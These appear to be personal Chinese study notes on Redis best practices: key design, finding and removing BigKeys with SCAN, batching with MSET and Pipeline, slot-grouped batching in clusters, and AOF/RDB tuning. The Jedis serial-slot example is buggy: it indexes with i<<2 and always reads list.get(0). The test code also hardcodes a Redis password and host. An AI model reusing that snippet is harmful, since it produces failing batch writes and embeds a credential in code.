# Redis最佳实践

## 键值设计

### 如何设计key？

> Redis的Key虽然可以自定义，但最好遵循下面的几个最佳实践约定：
>
> * **遵循基本格式：`[业务名称]:[数据名]:[id]`**
> * **长度不超过44字节**
> * **不包含特殊字符**

例如：我们登录业务，保存用户信息，其key是这样的：

![image-20220521120213631](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20220521120213631.png) 

这样设计的好处：

* 可读性强：根据名称就可以知道所属的业务

* 避免key冲突

* 方便管理：使用:隔开，在可视化界面中，同一个业务下的所有key都会放在同一个目录下

* key长度小于44字节更节省内存：key是string类型，底层编码包含int、embstr和raw三种。

  * 当字符串都是数字组成时，就会采用`int`编码，把字符串直接当成数字存储，占用的空间会小很多。
  * 若字符串中不仅仅包含数字，还包含其他字符时，就会采用`embstr`与`raw`的编码方式：
    * `embstr`在小于44字节时使用，采用连续内存空间，此时编码更加紧凑，内存占用更小。
    * 当字节数大于44字节时，会被转为`raw`模式存储，在raw模式下，内存空间不是连续的，而是采用指针指向另一段内存空间，在这段空间里存储内容，这样空间不是连续的，访问性能会受到影响，还有可能产生内存碎片，所以这种模式占用的内存比embstr模式更大。

  所以，由于我们的key还包含非数字字符，应该要保证key的长度小于44字节来使用`embstr`模式编码。

  例如：

  ```sh
  set 123 456
  ```

  此时的key底层就是使用int来存储的，但是一般情况下不仅仅包含数字，还包含其他字符。

  ```sh
  set name 456
  ```

  此时的name是使用embstr来存储的

  ```sh
  set aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 456
  ```

  此时，由a组成的这么长key，底层的编码方式就是raw，占用的空间更大。







---

### 如何设计value？

#### BigKey问题

> ##### `引入`

BigKey，顾名思义，就是占用内存很大的key。BigKey通常以key的大小和key中的成员数量来综合判定。（这里的key是指key=value这个结构，不是仅仅指key这个字符串）例如：

* **Key本身的数据量很大：**一个String类型的key，它的值为5MB。
* **Key中的成员数过多：**一个ZSET类型的key，它的成员数量为10000个。
* **Key中成员的数据量过大**：一个Hash类型的key，它的成员数量虽然只有1000个，但这些成员的value总值为100MB。



Redis中给我们提供了命令：

* **`MEMORY USAGE key`**：查看key所占用的内存大小，单位是字节。

例如：

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716105949578.png" alt="image-20240716105949578" style="zoom:80%;" /> 

但是，在实际的生成环境中不会使用该命令来查看key所占的内存大小，因为该命令对CPU的使用率较高。该命令得到的是一个key=value结构所占内存的实际大小，它包含了key的所占内存、value所占内存以及key=value这个数据结构所占内存大小。一般情况下，我们只需要知道value的大小即可。

* 对于String类型的value来说，我们可以使用`STRLEN key`命令来查看value所占内存空间大小；

  例如：

  <img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716111041752.png" alt="image-20240716111041752" style="zoom:80%;" /> 

  这就表示name这个key中的value，所占内存空间为3个字节。

* 对于List集合类型的value来说，我们可以使用`LLEN key`命令来查看集合中元素的数量大小。

  例如：

  <img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716111121366.png" alt="image-20240716111121366" style="zoom:80%;" /> 

  这里的使用LLEN l2的值为2，说明l2这个集合中有2个元素。

这两个命令可以用来大致判断key的大小。



> **key的推荐值：**
>
> * **`单个key的value值小于10KB`**
> * **`对于集合类型的key，建议元素数量小于1000`**





> ##### `BigKey的危害`

* **网络阻塞**

  对BigKey执行读请求时，少量的QPS就可能导致带宽使用率被占满，导致Redis实例，乃至所在物理机变慢。

* **数据倾斜**

  BigKey所在的Redis实例内存使用率远超其他实例，无法使数据分片的内存资源达到均衡。

* **Redis阻塞**

  对元素较多的hash、list、zset等做运算时会耗时较久，使主线程被阻塞。

* **CPU压力**

  对BigKey的数据序列化和反序列化会导致CPU的使用率飙升，影响Redis实例和本级其他应用。





> ##### `如何发现BigKey？`

1. **redis-cli --bigkeys**

利用redis-cli提供的--bigkeys参数，可以遍历分析所有key，并返回key的整体统计信息和每个数据的Top1的big key。

**命令：`redis-cli -a 密码 --bigkeys`**

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716113104305.png" alt="image-20240716113104305" style="zoom:67%;" />  

在summary之前的，都是在分析Redis中的key数据，summary之后就是分析的结果。

在本次扫描中，一共扫描了14个key，其中最大的list是"`l2`"，拥有两个元素；最大的string是"`item:id:10004`"，占用内存是467字节；最大的zset是"`s1`"，拥有3个成员。也就是说，这里面是每一种数据类型的占用内存最多的key。

**该命令是去获取每一种数据类型中，所占用内存最大的key。**

但是注意，使用该命令查看的每一种数据类型，占用内存最大的key并不一定是bigkey，并且没出现在上面的key也有可能是bigkey，比如第二大的key。所以该命令并不能准确获得所有的Bigkey，只能获得每种数据类型的top1key，信息不够完整，所以这种方式可以作为获取bigkey的参考，若想要获取所有bigkey信息，则不能使用这种方式。





2. **scan扫描**

> **先利用`scan`命令扫描Redis中的所有key，然后再利用`strlen`、`llen`、`hlen`等命令判断key的长度（不建议使用MEMORY USAGE）**

注意：`扫描Redis中所有的key不能使用keys *`。因为该命令会阻塞主线程，当Redis中有很多key时，此时主线程就会被阻塞很长时间，所以生产环境中不能使用keys *来扫描Redis中的所有key。

当我们要去获取Redis中的所有key时，可以使用scan命令：

![image-20240716115404407](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716115404407.png) 

SCAN命令一次性只扫描一小部分，不会导致Redis主线程被阻塞。

* `cursor`表示扫描的游标，第一次扫描时游标设置为0；
* `[MATCH pattern]`表示匹配的key类型，不指定表示扫描所有key；
* `[Count count]`表示一次性获取几个，不指定默认获取10个。



**使用SCAN案例**：扫描Redis实例中的所有key

使用SCAN 0命令开始SCAN扫描：

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716120417093.png" alt="image-20240716120417093" style="zoom:67%;" /> 

此时，返回的第一个结果表示下一次扫描时的游标，第二个结果就是一个集合类型，表示该次扫描的所有key，默认情况下扫描10个key；

然后我们再进行第二次扫描，使用第一次扫描时返回的第一个结果进行：

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716120754638.png" alt="image-20240716120754638" style="zoom:67%;" /> 

此时扫描返回值的第一个结果是下一次扫描的光标，第二个结果是扫描的所有key；

第三次扫描：

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716120906899.png" alt="image-20240716120906899" style="zoom:67%;" /> 

此时扫描返回的光标是0，表示扫描结束了，已经将所有的key全都扫描完毕；返回的第二个结果是该次扫描的所有key。

由上述的过程，我们可以在Java代码中实现：

`使用while循环的方式，从0开始进行SCAN扫描，每次扫描的游标都是上一次扫描返回的游标值，直到游标返回0，此时表示已经扫描完所有的key，结束循环，这样我们就得到了Redis实例中所有的key信息。`

在拿到key以后，使用`strlen`、`hlen`等命令进行value长度的判断，通过这种方式来模糊地判断key是否是bigkey（如果要准确判断需要使用MEMORY USAGE命令，该命令会占用较大的CPU资源，不建议使用）

**使用Java代码实现SCAN扫描案例**：

```java
public class BigKeyTest {
    private Jedis jedis;

    @BeforeEach
    void setUp(){
        //1、建立Jedis连接
        jedis = new Jedis("192.168.110.101", 6379);

        //设置密码
        jedis.auth("061535asd");

        //选择库
        jedis.select(0);
    }

    //设置字符串类型value最大为10KB
    final static int STR_MAX_LEN = 10 * 1024;

    //设置集合类型元素个数为500
    final static int HASH_MAX_LEN = 500;

    @Test
    public void testScan(){
        int maxLen = 0;
        long len = 0;

        //游标值
        String cursor = "0";
        do {
            //扫描一部分key
            ScanResult<String> result = jedis.scan(cursor);

            //记录当前扫描返回的cursor
            cursor = result.getCursor();

            //当前扫描的key
            List<String> keys = result.getResult();
            if (CollectionUtils.isEmpty(keys)){
                break;
            }

            //遍历key，判断该key是否是BigKey
            for (String key : keys) {
                //判断Key的类型，因为不同数据类型使用不同的方法来获取长度
                String type = jedis.type(key);
                switch (type){
                    case "string":
                        len = jedis.strlen(key);
                        maxLen = STR_MAX_LEN;
                        break;
                    case "hash":
                        len = jedis.hlen(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    case "list":
                        len = jedis.llen(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    case "set":
                        len = jedis.scard(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    case "zset":
                        len = jedis.zcard(key);
                        maxLen = HASH_MAX_LEN;
                        break;
                    default:
                        break;
                }
                //如果该key的value长度大于我们设定的值
                //则认为该key是BigKey
                if (len >= maxLen) {
                    System.out.printf("Found big key : %s, type: %s, length or size: %d %n", key, type, len);
                }
            }

        }while (!cursor.equals("0"));
    }
    
    @AfterEach
    void tearDown() {
        if (jedis != null){
            jedis.close();
        }
    }
}
```

这里使用了Jedis来实现Scan扫描功能，设定字符串类型的长度为10KB，集合类型的元素个数为500，然后使用strlen()、hlen()、llen()等方法获取key中value的长度，通过该长度与我们设定的值进行比较从而来模糊地判断key是否是BigKey，再对BigKey数据进行操作。

由于以上方式使用的是Scan命令而不是keys命令进行扫描，所以不会对我们Redis主进程有太大的影响，但是也不建议将上面的Java代码使用主进程进行执行。

执行结果：

![image-20240716140627645](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716140627645.png) 

可以看到，只要key满足我们设定的MAX长度，都能够查询出来。





3. **第三方工具**

利用第三方工具，如Redis-Rdb-Tools分析RDB快照文件，全面分析内存使用情况。

这种方式是离线分析，所以几乎不会对性能有影响，但是由于是离线的，所以时效性会有一些差。



4. **网络监控**

自定义工具，监控进出Redis的网络数据，超出预警值时主动告警，这种方式实现比较复杂。

一般阿里云搭建的云服务器就有相关监控的页面。

![image-20220521140415785](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20220521140415785.png) 





> ##### 如何删除BigKey？

当我们找到BigKey以后，不是简简单单删除就可以了，数据还是要保存的，一般是将BigKey进行拆分、存储，将BigKey变为"SmallKey"。

BigKey内存占用较多，即便是删除这样的key，也需要耗费很长的时间，导致Redis主线程阻塞，从而引发一系列问题。



**Redis 3.0及之前的版本：**

* 如果是集合类型，则遍历BigKey中的元素，先逐个删除子元素，最后删除BigKey。

扫描集合中的元素，可以使用`HSCAN`、`SSCAN`以及`ZSCAN`命令，使用方式与SCAN一样，它们会去扫描集合中所有的元素，这样我们就可以得到指定key中所有的元素，然后就可以对这些子元素进行删除从而实现删除BigKey的功能。



**Redis 4.0及以后版本：**

* 提供了异步删除的命令：**`unlink`**

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716141548003.png" alt="image-20240716141548003" style="zoom:80%;" /> 

这种删除，会将要删除的key标记为已删除，然后生成一个线程来删除该key，不会阻塞主线程。





---

#### 应该选择哪一种数据类型？

> **案例1：存储一个User对象**

存储一个对象，我们有三种存储方式：

1. **方式一：JSON字符串**

将一整个对象转换成JSON字符串存储在一个key中：

![image-20240716153120348](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716153120348.png) 

**优点**：实现简单粗暴。

**缺点**：数据耦合，不够灵活。





2. **方式二：字段打散**

将对象中的每个属性都作为一个key进行存储：

![image-20240716153732476](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716153732476.png) 

**优点**：可以灵活访问对象任意字段

**缺点**：占用空间大、没办法做统一控制。





3. **方式三：hash**（推荐）

将一个对象作为一个hash的key进行存储，对象中的每个属性都作为hash中的一个field存储：

![image-20240716153854605](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716153854605.png)

**优点：**底层使用ziplist数据结构，这种数据结构空间占用小，可以灵活访问对象的任意字段

**缺点：**代码相对复杂







> **案例2：假设有hash类型的key，其中有100万对field和value，field是自增id，这个key有什么问题？如何进行优化？**

![image-20240716154742401](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716154742401.png) 

**存在的问题：**

* 在默认情况下，Hash类型数据的Entry数量超过500对时，底层会使用`哈希表`而不是ZipList。那么由于底层数据结构的改变，原本Hash结构的内存优势就不存在了，此时占用的内存较多：

  <img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716154956342.png" alt="image-20240716154956342" style="zoom:67%;" /> 

  可以发现此时占用62.23MB。

  我们可以通过修改Redis中`hash-max-ziplist-entries`参数，来配置ZipList数据结构中entry的上限，可以让entry为100万对时也底层也使用ZipList数据结构。但是若entry过多时就会导致BigKey问题，所以不推荐将该值调整过高。以下是获取与修改该参数的命令：

  ![image-20240716155637411](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716155637411.png)



**解决方案**

* **方案一：拆分成string类型**（不推荐）

将hash类型数据中每个field都作为一个string类型的key进行存储：

![image-20240716162749255](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716162749255.png)

那么100万个field，就变成了100万个key，但是这样存储存在着很多问题：

1. string结构底层没有内存优化，每个key不仅仅包含key=value数据，还有元信息，此时内存占用较多；
2. 想要批量获取这些数据比较麻烦。

经过测试，使用这种方案占用的内存大小为：

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716163038426.png" alt="image-20240716163038426" style="zoom:67%;" />  

比原本hash类型所占用的内存还要更多，所以这种方案尽管解决了BigKey问题，不存在一个占用很大内存的key了，但是这种方案比原本的方案还要更差。





* **方案二：拆分成多个hash类型**（推荐）

将一个大的hash拆分成多个小的hash，比如将 id/100作为key，id%100作为field，这样一来，就会将100个元素作为一个hash进行存储。那么，原本只有1个hash数据，这个hash数据中包含100万个field，就会转变成有1万个hash数据，每个hash数据中包含100个field。

![image-20240716163933784](C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716163933784.png) 

这样一来，每个hash数据中只包含100个field，没有超过500个entry数量，所以此时底层都是使用`ZipList`数据结构实现的，内存空间占用较小。

经过测试，这种方案占用的内存大小为：

<img src="C:/Users/14036/Desktop/mdNotes/8、Redis/images/image-20240716164003712.png" alt="image-20240716164003712" style="zoom:67%;" /> 





**总结**

Key的最佳实践：

* 固定格式：[业务名]:[数据名]:[id]
* 足够简短：不超过44字节
* 不包含特殊字符

Value的最佳实践：

* 合理的拆分数据，拒绝BigKey
* 选择合适数据结构
* Hash结构的entry数量不要超过1000
* 设置合理的超时时间





---

## 批处理命令优化

批处理，也就是处理很多数据，比如我们之前学习GEO数据类型时，将所有商品的地理坐标信息查询出来，然后存入到GEO数据中。

但是这种做法是在数据量比较少的情况下，如果数据量非常多，此时就不能暴力地往Redis中直接存入大量数据了，所以这一章我们就是来学习一下如何优雅地处理海量的数据。

### Pipeline

**Pipeline是用来实现`单机模式`下的批处理功能。**

> **问题引入**

假设有一大堆粮食要搬运到仓库，有几种方法？

可以一次性搬运比较少的量，多搬几次；也可以一次性搬运比较多的量，少搬几次。

这两种哪一种效率比较高，取决于粮食到仓库之间的距离，假设粮食到仓库之间路程比较短，那其实使用哪一种方式都差不多；如果粮食到仓库之间的距离非常远，那么我们应该尽量减少搬运的次数，因为花费在路程上的时间比较多，所以此时选择一次性搬运比较多的粮食，少搬运几次速度会比较快。



> **单个命令的执行流程**

![image-20240716170327668](.\images\image-20240716170327668.png) 

单个命令执行流程包括发送命令、执行命令以及返回结果三个过程。

客户端向服务端发送命令，命令需要经过网络传输，这一个过程就相当于搬运粮食时花费在路上的时间；传输到Redis后Redis开始执行命令，这一过程就相当于粮食到达仓库后的卸货时间；命令执行完毕以后，然后将命令执行的结果返回给客户端，同理返回给客户端的过程也需要经过网络传输，也相当于运输粮食在路上所花费时间。

所以：

**`一次命令的响应时间 = 1次往返的网络传输耗时 + 1次Redis执行命令耗时`**

实际上，命令执行所花费的时间是非常短的，执行一个命令差不多只需要花费5微秒；但是网络传输耗费的时间相对于命令执行时间，则是非常长的，所以执行一个命令所花的多部分时间都在网络传输上了。

**相对于网络传输时间来说，执行命令所花费的时间可以忽略不计。**





> **N条命令执行依次执行**

**`N次命令的响应时间 = N次往返的网络传输耗时 + N次Redis执行命令耗时`**

那么假设此时有N条命令依次要去执行，此时所花费的就相当于一条命令执行所花费的时间 * N：

![image-20240716171551870](.\images\image-20240716171551870.png)

由于命令执行所花费的时间，与网络传输所花费的时间不是一个数量级的，所以执行N次命令所花的大部分时间都花费在了网络传输上。

因此，进行批处理时，应该一次性执行很多命令，从而减少网络传输的次数，进而减少执行所花费的时间。





> **N条命令批量执行**

一次网络传输，就将N条命令一次性都发送到Redis服务端，那么此时N条命令只会进行一次网络传输：

![image-20240716180303361](.\images\image-20240716180303361.png)

**`N次命令的响应时间 = 1次往返的网络传输耗时 + N次Redis执行命令耗时`**

这样就减少了N-1次往返的网络传输耗时，由于执行命令所花费的时间比网络传输所花费的时间快一个量级，所以这种模式的效率是非常高的。

那我们该如何一次性批量执行命令呢？





> **MSET**

Redis提供了很多Mxxx这样的没拿过来，可以实现批量插入数据，例如：

* `mset`
* `hmset`

![image-20240716180712548](.\images\image-20240716180712548.png) 

MSET命令中可以设置多个key value，这样实际上就是实现了批处理命令，一次性存入多个数据。

例如：使用Java代码来实现利用MSET批量插入10万条数据：

```java
@Test
void testMxx() {
    String[] arr = new String[2000];
    int j;
    long b = System.currentTimeMillis();
    for (int i = 1; i <= 100000; i++) {
        j = (i % 1000) << 1;
        arr[j] = "test:key_" + i;
        arr[j + 1] = "value_" + i;
        if (j == 0) {
            jedis.mset(arr);
        }
    }
}
```

这里使用MSET命令，传入长度为2000的arr数组，该数组中key和value都会占用一个元素，所以这里的MSET命令是一次性插入1000组key=value数据，即一次性批处理1000个命令。

经过测试，上述执行所花费的时间非常短，效率很高。

**问题**：那为什么这里一次性只插入1000组数据，不将所有的100000数据都一次性插入到Redis中呢？

虽然一次性执行更多命令可以提高执行的效率，但是如果一次性执行太多的命令时会占用大量的网络带宽，此时网络就可能会被阻塞，导致数据无法传输反而影响命令的执行，所以批处理命令也要有个度，每次传输的命令不宜过多，适量即可。所以：

> **注意：不要在一次批处理中传输太多命令，否则单次命令占用带宽过多，会导致网络阻塞。**







> **`Pipeline`**

`MSET`命令只能处理string类型，对于Hash类型，可以使用`HMSET`命令来实现批处理，但是对于其他数据类型，比如List、Set、SortedSet等，没有对应的命令来实现插入的批处理功能。

对于复杂数据类型的批处理，需要使用到**`Pipeline`**来实现。

**`Pipeline`：意思为管道，我们使用它来实现批处理功能时，是将这些要执行的命令，塞到Pipeline这个管道中，然后一次性传输给Redis服务器，让服务器去执行管道中的命令。**

与MSET不同的是，MSET只能去批量插入string类型的数据，而Pipeline中允许传入各种不同的命令，比如我们在插入string数据的同时，也能够去插入List数据、插入SET数据等等，所以Pipeline能够实现更加复杂的批处理操作，更加灵活。

**使用案例**

```java
@Test
void testPipeline() {
    // 创建管道
    Pipeline pipeline = jedis.pipelined();
    long b = System.currentTimeMillis();
    for (int i = 1; i <= 100000; i++) {
        // 放入命令到管道
        pipeline.set("test:key_" + i, "value_" + i);
        if (i % 1000 == 0) {
            // 每放入1000条命令，批量执行
            pipeline.sync();
        }
    }
    long e = System.currentTimeMillis();
    System.out.println("time: " + (e - b));
}
```

以上也是每隔1000条命令执行一次批处理命令（一次性不要传输过多命令），经过测试，以上所花费的时间与MSET所花费的时间差不多，速度都是很快。

并且，不仅仅可以使用上述的set()方法存入string类型数据插入命令，也可与使用sadd()、lpush()、zadd()、hset()命令等来存入其他类型的数据，比MSET命令更加灵活。





**总结**

单机模式下批处理的方案：

1. 原生的M命令
2. Pipeline批处理

注意事项

1. 批处理时不建议一次性携带太多命令
2. Pipeline的多个命令之间不具备原子性







---

### 集群模式下的批处理

如MSET或Pipeline这样的批处理需要在一次请求中携带多条命，而此时如果Redis是一个集群，那批处理命令的多个key必须落在一个插槽中，否则就会执行失败。（这里的集群指的是分片集群，如果是主从集群写操作一定是落在同一个主节点中，不需要考虑别的问题）

在分片集群中，每次插入数据时，都会使用hash算法计算出key所在的插槽，然后将key存入到插槽所对应的主节点中。而批处理一次性会携带很多条命令，并且批处理是在一次连接中将所有命令都执行，在分片集群中，key保存在不同的主节点上，就需要建立多次连接，此时就不再是批处理命令，所以此时，在集群中使用MSET或Pipeline执行批处理命令就会报错。

案例：

我们开启一个分片集群后，使用MSET命令执行批处理操作：

![image-20240716204154368](.\images\image-20240716204154368.png) 

此时执行就会报错，因为无法保证插入命令都是在同一个节点上执行的，而批处理命令只会连接一次。同理Pipeline也无法使用。

**分片集群上批处理的四种解决方案**

![1653126446641](.\images\1653126446641.png) 

* **第一种方案：串行执行**。也就是使用一个for循环，一遍一遍地执行命令。这种方案的耗时也就是所有命令分开执行所花费的时间之和，耗时为：**`N次网络耗时 + N次命令耗时`**。这种方案没有什么意义，实现比较简单，但是耗时特别久。



* **第二种方案：串行slot。**

  在客户端中计算出每个key的slot值（插槽值），将slot一致的分为一组，每组利用Pipeline批处理，然后串行地执行每组的Pipeline批处理命令。

  此时的**`耗时 = m次网络耗时 + N次命令耗时`**

  m = key的slot个数

  这种方式耗时较短，实现较为复杂，slot越多，耗时越久，因此这种方案不够完美，还有改进的空间。



* > **`第三种方案：并行slot（推荐）`**

  这种方案，与串行slot唯一的区别就在于，串行slot是串行执行每个slot组中的批处理命令，并行slot各个组之间不是串行等待执行了，而是并行地去执行各个组的批处理命令。

  也就是说，如果这些命令根据key的slot分成了N个组，那么就开启N个线程并行地去执行各个组中的批处理命令。所以此时，虽然也是进行了N次网络传输，但是由于这N次网络传输是并行执行的，所以耗时是一次网络耗时，不再是串行slot方案中的N次网络耗时。

  所以，这种方案**`耗时 = 1次网络耗时 + N次命令耗时`**

  这种方案耗时非常短，但是实现更加复杂，当slot值过多，此时要开启过多的线程去并行执行，存在着性能上的损耗，但是肯定比第二种方案性能高。



* **第四种方案：hash_tag**

  我们学习过，在分片集群中，计算key的插槽值实际上根据key的有效部分进行计算的，当key中包含{}大括号并且大括号中有字符时，则根据{}大括号中的字符来计算插槽值；如果key中不存在{}大括号或者大括号中没有字符，则根据整体计算插槽值。

  如果我们为每一个key都设置相同的有效部分，比如给每一个key前面添加一个{a}前缀，那这样每一个key所计算出来的插槽值都是一样的，这样一来，我们在进行批处理操作时，就只会在同一个节点中插入数据，这样就能够一次性处理所有key。那么此时在分片集群中去执行MSET命令：

  <img src=".\images\image-20240716211442641.png" alt="image-20240716211442641" style="zoom:67%;" />  

  就可以执行了，因为此时的key插槽值都是一样的，能够保证在同一个节点上执行。

  此时的**`耗时 = 1次网络耗时 + N次命令耗时`**

  这种方式耗时最短，并且实现也比较简单，但是如果通过操作key的有效部分，就会导致所有的key落在一个节点上，产生数据倾斜问题。



综上所述，推荐使用第三种方式来实现集群的批处理操作。

**案例1：在Redis分片集群中，使用Jedis来实现串行slot方案。**

```java
public class JedisClusterTest {

    private JedisCluster jedisCluster;
    
	//配置Redis分片集群
    @BeforeEach
    void setUp() {
        HashSet<HostAndPort> nodes = new HashSet<>();
        nodes.add(new HostAndPort("192.168.110.101", 7001));
        nodes.add(new HostAndPort("192.168.110.101", 7002));
        nodes.add(new HostAndPort("192.168.110.101", 7003));
        nodes.add(new HostAndPort("192.168.110.101", 8001));
        nodes.add(new HostAndPort("192.168.110.101", 8002));
        nodes.add(new HostAndPort("192.168.110.101", 8003));
        jedisCluster = new JedisCluster(nodes);
    }


    //先去计算每个key的slot值，根据slot值大小进行分组
    //然后将每一组中key、value放在同一个数组中，使用MSET命令一次性执行
    @Test
    void testMSet2() {
        Map<String, String> map = new HashMap<>(3);
        map.put("name", "Jack");
        map.put("age", "21");
        map.put("sex", "Male");
        //对Map数据进行分组。根据相同的slot放在一个分组
        //这个Map的key就是slot插槽值，Map的value就是同一个组中的所有的Key
        Map<Integer, List<Map.Entry<String, String>>> result = map.entrySet()
                .stream()
                .collect(Collectors.groupingBy(
                        entry -> ClusterSlotHashUtil.calculateSlot(entry.getKey()))
                );


        //串行的去执行mset的逻辑
        for (List<Map.Entry<String, String>> list : result.values()) {
            String[] arr = new String[list.size() * 2];
            int j = 0;
            //去将同一个组中的数据组装起来，放到arr[]中
            for (int i = 0; i < list.size(); i++) {
                j = i<<2;
                Map.Entry<String, String> e = list.get(0);
                arr[j] = e.getKey();
                arr[j + 1] = e.getValue();
            }
            jedisCluster.mset(arr);
        }
    }

    @AfterEach
    void tearDown() {
        if (jedisCluster != null) {
            jedisCluster.close();
        }
    }
}
```

以上这种方案，是自己手动地去计算每个key所对应的slot值，并将相同slot值的key放在同一个List集合中，最后取出List集合中的元素，并将元素存入到数组中，调用Jedis的mset()方法，将数组中的数据一次性插入到Redis中，从而实现集群的批处理功能。





**案例2：在Spring集群环境下批处理代码**

```java
@Test
void testMSetInCluster() {
    Map<String, String> map = new HashMap<>(3);
    map.put("name", "Rose");
    map.put("age", "21");
    map.put("sex", "Female");
    stringRedisTemplate.opsForValue().multiSet(map);


    List<String> strings = stringRedisTemplate.opsForValue().multiGet(Arrays.asList("name", "age", "sex"));
    strings.forEach(System.out::println);
}
```

可以发现，在Sping给我们提供的Redis客户端中，已经帮助我们封装了批处理命令，我们只需要直接调用即可。

使用了`multiSet()`对数据执行批处理插入，使用`multGet()`对数据执行批处理获取。

multiSet()方法最终会调用`RedisAdvancedClusterAsyncCommandsImpl`中的`mset()`方法实现批处理操作：

![image-20240716225212769](.\images\image-20240716225212769.png)

在该mset()方法中：

先去执行`partition()`方法，也就是分区操作，根据map中的key来计算插槽值，将相同插槽值的key放在同一个List集合中。

然后去遍历使用slot值进行分组的Map集合，将同一个组中的key=value放在一个Map集合op中。

在获得同一个组中所有key的Map集合op后，最后调用一个`mset()`方法去进行异步执行批处理操作，可以认为是使用**并行slot方案**来实现异步执行的批处理。

也就是说，Spring给我们提供的Redis客户端，已经整合了集群模式下的批处理操作，我们直接使用即可，底层原理使用的是并行slot方案。









---

## 服务器端优化

### 持久化配置

Redis的持久化虽然可以保证数据安全，但也会带来很多额外的开销，因此持久化请遵循下列建议：

1. > **`用来做缓存的Redis实例尽量不要开启持久化功能；`**

   缓存数据的目的是为了查询的效率，即便缓存失效了，再次查询也会将缓存重新获取，所以这一部分数据的安全性要求不高，因此没有必要做持久化。在开发时，如果在条件允许的情况下，建议将缓存的相关业务放在单独一个Redis实例中，这个Redis实例就不需要开启持久化功能，而对于安全性要求较高的Redis数据，比如分布式锁、商品库存等数据，所处的Redis实例就需要开启持久化功能。

2. > **`建议关闭RDB持久化功能，使用AOF持久化；`**

   RDB频率不高，两次RDB持久化操作之间会间隔比较长的时间，在这期间内数据有可能会丢失，并且RDB是使用fork机制，在fork期间Redis主进程会被阻塞，会有大量的磁盘IO，因此不建议频繁地进行RDB持久化。与之相比，AOF采用的是每秒刷盘的策略，最多只会丢失这1秒内的数据，安全性有保障，虽然生成的AOF文件大小会比RDB文件大得多，但是在可接受范围内。

3. > **`利用脚本定期在slave节点做RDB，实现数据备份；`**

   虽然不建议使用RDB来实现持久化功能，但是由于RDB文件占用的磁盘空间较小，我们可以定期地执行RDB命令来对slave进行持久化，实现数据备份的功能，万一Redis实例崩溃了，可以根据这个RDB文件来实现数据的恢复。

4. > **`AOF持久化需要设置合理的rewrite阈值，避免频繁地对AOF文件进行重写；`**

   对于AOF持久化来说，其AOF文件中存储的是执行的命令，所以所占的磁盘空间比较大，AOF文件中也会存储一些没有用的命令，所以需要会对AOF文件进行重写从而减少文件中存储的没有用的命令，减少其所占的磁盘空间。当满足设置的rewrite阈值时，AOF会自动触发重写操作，但是重写会占用较高的CPU资源，它会去计算哪些命令需要重写，并且在重写过程中会进行大量的磁盘IO，如果频繁地进行重写对性能会造成影响。因此，AOF持久化需要设置合理的rewrite阈值，来避免频繁地进行重写操作。

   默认配置：

   ```ini
   # AOF文件体积最小多大以上才触发重写
   auto-aof-rewrite-min-size 64mb
   
   # AOF文件比上次文件增长多少百分比则触发重写
   auto-aof-rewrite-percentage 100
   ```

   即当AOF文件大小是上次重写后大小的一倍且该文件大于64MB时，会自动触发AOF重写。

5. > **`在conf配置文件中，配置no-appendfsync-on-rewrite=yes，禁止在rewrite期间做aof，避免因AOF引起阻塞。`**

   AOF默认情况下会每隔1秒中进行刷盘，刷盘时需要进行磁盘的IO，假设此时rewrite重写正在执行，该rewrite操作对磁盘的占用非常高，此时就会影响AOF的刷盘机制。我们来看个图：

   <img src="C:\Users\14036\AppData\Roaming\Typora\typora-user-images\image-20240717001827536.png" alt="image-20240717001827536" style="zoom:67%;" /> 

   主线程在接收到写操作命令时，除了将数据写入到内存以外，还会将命令写入到AOF缓冲区中，该缓冲区保存的就是这1秒内所有的写命令，然后存在一个线程将缓冲区的数据每隔1秒写入到磁盘中的AOF文件中，这个动作就称为fsync，也就是刷盘。而我们的主线程将命令写入到缓冲区中并没有结束，它会去判断刷盘的耗时，如果刷盘耗时小于2秒，则直接结束执行命令；如果刷盘时间大于2秒，那么此时主线程就会被阻塞，因为刷盘时间大于2秒，说明刷盘这个功能出现了问题，数据的安全性无法得到保证，所以主线程也就不再接收任何命令，会被阻塞直到刷盘成功为止。

   当我们进行AOF持久化操作时，正在执行rewrite重写或者RDB的fork操作时，此时会占用较大的磁盘IO，同步线程去同步磁盘的操作就会可能会被阻塞，从而导致主线程被阻塞，从而影响整个Redis的性能，因此我们需要去配置no-appendfsync-on-rewrite=yes，禁止在重写期间做AOF操作，这样就能够避免因同步线程被阻塞而导致Redis主线程被阻塞。

   但是，若配置了no-appendfsync-on-rewrite=yes，则在rewrite期间所执行的写命令不会被AOF持久化，那就有可能导致数据的丢失问题，所以这是一种权衡，如果更关注数据的安全性，那就不要配置该参数；如果更关注性能，则需要将该参数配置为yes。



> **部署Redis有关建议：**
>
> * Redis实例的物理机要预留足够的内存，应对fork和rewrite；
> * 单个Redis实例内存上限不要太大，例如4G或8G。可以加快fork的速度、减少主从同步、数据迁移压力。
> * 在fork时会占用较大的CPU资源，所以不要与CPU密集型应用部署在一起。例如：ES。
> * 在进行rewrite与AOF时会进行大量磁盘IO，所以不要与高硬盘负载应用一起部署。例如：数据库、消息队列。
>







---

### 慢查询优化

